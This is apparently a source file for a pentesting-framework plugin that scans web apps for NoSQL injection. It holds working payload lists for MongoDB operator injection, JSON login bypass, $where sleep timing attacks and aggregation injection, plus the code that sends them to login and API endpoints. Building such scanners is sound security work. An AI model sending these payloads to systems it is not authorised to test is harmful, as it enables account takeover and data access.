"""NoSQL injection detection — MongoDB/CouchDB operators, auth bypass, blind timing.

Uses PayloadEngine for NoSQLi payloads, WafBypassEngine for WAF evasion.
Detects: operator injection ($ne/$gt/$regex/$where), auth bypass,
time-based blind ($where sleep), aggregation injection, JS injection.
Level: nosqlmap-lite (detection).
"""

from __future__ import annotations

import json
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import PayloadCategory

# ── Query string operator injection ────────────────────────────────────
QS_PAYLOADS = [
    ("[$ne]=", "operator_ne"),
    ("[$gt]=", "operator_gt"),
    ("[$gte]=", "operator_gte"),
    ("[$lt]=", "operator_lt"),
    ("[$regex]=.*", "operator_regex"),
    ("[$exists]=true", "operator_exists"),
    ("[$in][]=admin", "operator_in"),
    ("[$nin][]=guest", "operator_nin"),
    ("[$or][0][username]=admin", "operator_or"),
    ("[$where]=1", "operator_where"),
    ("[$type]=2", "operator_type"),
    ("[$size]=1", "operator_size"),
]

# ── JSON body payloads (auth bypass) ───────────────────────────────────
JSON_AUTH_PAYLOADS = [
    ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "auth_bypass_gt"),
    ({"username": {"$ne": ""}, "password": {"$ne": ""}}, "auth_bypass_ne"),
    ({"username": {"$ne": "nonexistent"}, "password": {"$ne": "x"}}, "auth_bypass_ne2"),
    ({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}, "auth_bypass_regex"),
    ({"username": {"$regex": "^admin"}, "password": {"$gt": ""}}, "auth_bypass_admin_regex"),
    ({"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}},
     "auth_bypass_in"),
    ({"username": "admin", "password": {"$regex": ".*"}}, "auth_bypass_admin_pass"),
    ({"$or": [{"username": "admin"}, {"username": "root"}],
      "password": {"$ne": ""}}, "auth_bypass_or"),
]

# ── Time-based blind payloads ──────────────────────────────────────────
JSON_TIME_PAYLOADS = [
    ({"$where": "sleep(3000)"}, "time_where_sleep", 2.5),
    ({"$where": "function(){sleep(3000);return true;}"}, "time_where_func", 2.5),
    ({"$where": "this.a==1||sleep(3000)"}, "time_where_or", 2.5),
    ({"username": {"$where": "sleep(3000)"}}, "time_field_where", 2.5),
]

# ── JS injection in $where ─────────────────────────────────────────────
JSON_JS_PAYLOADS = [
    ({"$where": "return true"}, "js_true", "always_true"),
    ({"$where": "return false"}, "js_false", "always_false"),
    ({"$where": "this.username=='admin'"}, "js_field_access", "field_access"),
]

# ── Aggregation pipeline injection ─────────────────────────────────────
JSON_AGGREGATION = [
    ([{"$match": {"username": {"$ne": ""}}}], "agg_match"),
    ([{"$group": {"_id": "$username"}}], "agg_group"),
    ([{"$lookup": {"from": "users", "localField": "id",
       "foreignField": "id", "as": "data"}}], "agg_lookup"),
]

# ── Scan targets ───────────────────────────────────────────────────────
AUTH_PAGES = [
    "/login", "/api/login", "/api/auth", "/api/v1/login",
    "/auth", "/signin", "/api/signin", "/api/v1/auth",
    "/api/authenticate", "/api/session", "/auth/login",
    "/users/login", "/users/sign_in",
]

SEARCH_PAGES = [
    "/api/search", "/api/users", "/api/v1/users", "/search",
    "/api/products", "/api/items", "/api/v1/search", "/api/query",
    "/api/find", "/api/list", "/api/v2/users",
]

API_PAGES = [
    "/api/user", "/api/v1/user", "/api/profile", "/api/account",
    "/api/data", "/api/records", "/api/v1/data",
]


class NosqliCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="nosqli_check",
        display_name="NoSQL Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects NoSQL injection: MongoDB operators, auth bypass, "
            "time-based blind, JS injection, aggregation pipeline"
        ),
        produces=["nosqli_findings"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"nosqli_tests": []},
            )

        # Get PayloadEngine payloads
        engine_payloads = self._get_engine_payloads(ctx)

        # Phase 1: Query string operator injection on search/API pages
        all_pages = list(SEARCH_PAGES) + list(API_PAGES)
        extra = ctx.state.get("discovered_api_paths", {}).get(target.host, [])
        all_pages.extend(p for p in extra if p not in all_pages)

        for page in all_pages:
            if ctx.should_stop or len(findings) >= 3:
                break
            await self._check_qs_injection(
                ctx, base_url, page, findings, tested,
            )

        # Phase 2: JSON body auth bypass
        if not ctx.should_stop:
            for page in AUTH_PAGES:
                if ctx.should_stop or len(findings) >= 3:
                    break
                await self._check_json_auth_bypass(
                    ctx, base_url, page, findings, tested,
                )

        # Phase 3: Time-based blind via $where
        if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
            for page in AUTH_PAGES[:5] + all_pages[:5]:
                if ctx.should_stop:
                    break
                await self._check_time_based(
                    ctx, base_url, page, findings, tested,
                )

        # Phase 4: JS injection differential ($where true vs false)
        if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
            for page in all_pages[:5]:
                if ctx.should_stop:
                    break
                await self._check_js_differential(
                    ctx, base_url, page, findings, tested,
                )

        # Phase 5: PayloadEngine payloads
        if engine_payloads and not ctx.should_stop:
            for page in all_pages[:3]:
                if ctx.should_stop:
                    break
                for ep in engine_payloads[:10]:
                    if ctx.should_stop:
                        break
                    url = f"{base_url}{page}?q={quote(ep)}"
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = await resp.text(encoding="utf-8", errors="replace")
                            if resp.status == 200 and len(body) > 50:
                                tested.append({
                                    "page": page, "payload": ep[:60],
                                    "method": "GET", "label": "engine_payload",
                                })
                    except Exception:
                        continue

        if not findings:
            findings.append(Finding.info(
                "No NoSQL injection vulnerabilities detected",
                tags=["pentesting", "nosqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"nosqli_tests": tested},
        )

    # ── Helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _get_engine_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.NOSQLI, max_waf=1, limit=15)
            return [p.value for p in payloads]
        return []

    async def _check_qs_injection(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test query string operator injection."""
        # Baseline
        baseline_len = -1
        baseline_status = 0
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    f"{base_url}{page}?q=test", timeout=8.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                baseline_len = len(body)
                baseline_status = resp.status
        except Exception:
            return

        page_anomalies: list[dict] = []

        for qs_payload, label in QS_PAYLOADS:
            if ctx.should_stop:
                break
            url = f"{base_url}{page}?q{quote(qs_payload, safe='')}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
            except Exception:
                continue

            size_diff = abs(len(body) - baseline_len)
            status_changed = resp.status != baseline_status
            size_anomaly = (
                resp.status == 200
                and size_diff > max(baseline_len * 0.3, 100)
            )

            if status_changed or size_anomaly:
                page_anomalies.append({
                    "label": label,
                    "payload_status": resp.status,
                    "size_diff": size_diff,
                    "status_changed": status_changed,
                })

        if not page_anomalies:
            return

        # WAF detection
        all_same_status = (
            len(page_anomalies) >= 3
            and all(a["status_changed"] for a in page_anomalies)
            and len({a["payload_status"] for a in page_anomalies}) == 1
        )

        if all_same_status:
            waf_status = page_anomalies[0]["payload_status"]
            tested.append({
                "page": page, "label": "waf_detected", "method": "GET",
            })
            findings.append(Finding.low(
                f"WAF blocks MongoDB operators on {page} "
                f"({baseline_status}->{waf_status})",
                description=(
                    f"All {len(page_anomalies)} operators caused identical "
                    f"status change — WAF filtering."
                ),
                evidence=f"URL: {base_url}{page}",
                remediation="WAF is blocking MongoDB operators.",
                tags=["pentesting", "nosqli", "waf-fp"],
            ))
        else:
            first = page_anomalies[0]
            tested.append({
                "page": page, "label": first["label"], "method": "GET",
                "anomaly_count": len(page_anomalies), "confirmed": True,
            })
            findings.append(Finding.high(
                f"NoSQL injection via query param on {page}",
                description=(
                    f"MongoDB operator {first['label']} caused anomalous response. "
                    f"{len(page_anomalies)}/{len(QS_PAYLOADS)} operators triggered."
                ),
                evidence=(
                    f"URL: {base_url}{page}\n"
                    f"Baseline: {baseline_status}\n"
                    f"Anomalous: {', '.join(a['label'] for a in page_anomalies)}"
                ),
                remediation=(
                    "Sanitize input before NoSQL queries. Use parameterized queries. "
                    "Reject objects/arrays in query parameters."
                ),
                tags=["pentesting", "nosqli", "injection"],
            ))

    async def _check_json_auth_bypass(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test JSON body auth bypass payloads."""
        url = f"{base_url}{page}"

        # Baseline: normal failed login
        normal_body = json.dumps({"username": "admin", "password": "wrongpass123"})
        try:
            async with ctx.rate:
                base_resp = await ctx.http.post(
                    url, data=normal_body,
                    headers={"Content-Type": "application/json"},
                    timeout=8.0,
                )
                base_text = await base_resp.text(encoding="utf-8", errors="replace")
                base_status = base_resp.status
                base_len = len(base_text)
        except Exception:
            return

        page_anomalies: list[dict] = []

        for payload_obj, label in JSON_AUTH_PAYLOADS:
            if ctx.should_stop:
                break
            payload_str = json.dumps(payload_obj)
            try:
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url, data=payload_str,
                        headers={"Content-Type": "application/json"},
                        timeout=8.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
            except Exception:
                continue

            reason = ""
            if resp.status != base_status:
                reason = f"Status {base_status}->{resp.status}"
            elif abs(len(body) - base_len) > max(base_len * 0.3, 100):
                reason = f"Size {base_len}->{len(body)}"

            # Check for auth success indicators
            body_lower = body.lower()
            auth_success = any(
                ind in body_lower
                for ind in ["token", "session", "welcome", "dashboard",
                            "success", "authenticated", "logged"]
            )
            if auth_success and resp.status in (200, 302):
                reason = f"Auth success indicators + status {resp.status}"

            if reason:
                page_anomalies.append({
                    "label": label, "reason": reason,
                    "payload_status": resp.status,
                    "status_changed": resp.status != base_status,
                })

        if not page_anomalies:
            return

        # WAF check
        all_same = (
            len(page_anomalies) >= 2
            and all(a["status_changed"] for a in page_anomalies)
            and len({a["payload_status"] for a in page_anomalies}) == 1
        )

        if all_same:
            tested.append({"page": page, "label": "waf_detected", "method": "POST"})
            findings.append(Finding.low(
                f"WAF blocks NoSQL operators on {page}",
                description="All JSON operators blocked uniformly.",
                evidence=f"URL: {url}",
                tags=["pentesting", "nosqli", "waf-fp"],
            ))
        else:
            first = page_anomalies[0]
            sev = "critical" if "auth_bypass" in first["label"] else "high"
            tested.append({
                "page": page, "label": first["label"],
                "method": "POST", "reason": first["reason"], "confirmed": True,
            })
            findings.append(getattr(Finding, sev)(
                f"NoSQL injection: auth bypass on {page}",
                description=(
                    f"NoSQL operator injection: {first['reason']}. "
                    f"{len(page_anomalies)} operators anomalous."
                ),
                evidence=(
                    f"URL: {url}\n"
                    f"Anomalous: {', '.join(a['label'] for a in page_anomalies)}"
                ),
                remediation=(
                    "Never pass raw input to NoSQL queries. "
                    "Use ODM with proper sanitization. Cast types explicitly."
                ),
                tags=["pentesting", "nosqli", "injection"],
            ))

    async def _check_time_based(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Time-based blind NoSQL injection via $where sleep."""
        url = f"{base_url}{page}"

        for payload_obj, label, threshold in JSON_TIME_PAYLOADS:
            if ctx.should_stop:
                break
            payload_str = json.dumps(payload_obj)
            try:
                async with ctx.rate:
                    t0 = time.monotonic()
                    _resp = await ctx.http.post(
                        url, data=payload_str,
                        headers={"Content-Type": "application/json"},
                        timeout=15.0,
                    )
                    elapsed = time.monotonic() - t0
                    del _resp
            except Exception:
                continue

            if elapsed > threshold:
                # Confirm with second attempt
                try:
                    async with ctx.rate:
                        t0 = time.monotonic()
                        await ctx.http.post(
                            url, data=payload_str,
                            headers={"Content-Type": "application/json"},
                            timeout=15.0,
                        )
                        retry = time.monotonic() - t0
                except Exception:
                    continue

                if retry > threshold:
                    tested.append({
                        "page": page, "label": label, "method": "POST",
                        "elapsed": round(elapsed, 2),
                        "retry": round(retry, 2), "confirmed": True,
                    })
                    findings.append(Finding.critical(
                        f"Time-based NoSQL injection on {page}",
                        description=(
                            f"$where sleep() caused {elapsed:.1f}s delay "
                            f"(confirmed: {retry:.1f}s)"
                        ),
                        evidence=f"URL: {url}\nPayload: {label}",
                        remediation=(
                            "Disable $where operator. Never pass user input "
                            "to NoSQL JavaScript evaluation."
                        ),
                        tags=["pentesting", "nosqli", "time-based"],
                    ))
                    return

    async def _check_js_differential(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Differential detection: $where true vs $where false."""
        url = f"{base_url}{page}"

        true_payload = json.dumps({"$where": "return true"})
        false_payload = json.dumps({"$where": "return false"})

        try:
            async with ctx.rate:
                true_resp = await ctx.http.post(
                    url, data=true_payload,
                    headers={"Content-Type": "application/json"},
                    timeout=8.0,
                )
                true_body = await true_resp.text(encoding="utf-8", errors="replace")

            async with ctx.rate:
                false_resp = await ctx.http.post(
                    url, data=false_payload,
                    headers={"Content-Type": "application/json"},
                    timeout=8.0,
                )
                false_body = await false_resp.text(encoding="utf-8", errors="replace")
        except Exception:
            return

        # Significant difference between true and false
        size_diff = abs(len(true_body) - len(false_body))
        status_diff = true_resp.status != false_resp.status

        if (
            (size_diff > max(len(true_body) * 0.2, 100) or status_diff)
            and true_resp.status in (200, 302)
        ):
            tested.append({
                "page": page, "label": "js_differential",
                "method": "POST", "confirmed": True,
                "true_len": len(true_body), "false_len": len(false_body),
            })
            findings.append(Finding.high(
                f"NoSQL JS injection: $where differential on {page}",
                description=(
                    f"$where true ({len(true_body)} bytes, {true_resp.status}) vs "
                    f"$where false ({len(false_body)} bytes, {false_resp.status})"
                ),
                evidence=f"URL: {url}\nSize diff: {size_diff}",
                remediation=(
                    "Disable $where operator in MongoDB. "
                    "Never evaluate user input as JavaScript."
                ),
                tags=["pentesting", "nosqli", "js-injection"],
            ))
